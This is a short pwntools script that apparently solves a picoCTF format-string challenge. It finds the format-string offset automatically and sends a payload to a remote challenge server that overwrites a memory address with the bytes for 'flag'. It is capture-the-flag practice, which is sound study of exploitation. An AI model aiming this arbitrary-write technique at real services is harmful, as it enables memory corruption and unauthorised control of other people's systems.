from pwn import *

context.log_level = 'critical'
context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 51408)
print("First p : ", p)
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 51408)
    p.sendline(payload)
    print("Second p ", p)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
print(autofmt)
offset = autofmt.offset
print(offset)
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
print(payload)
p.sendline(payload)
print("Third p " ,p)
# flag = p.recvall()

# print("Flag: ", flag)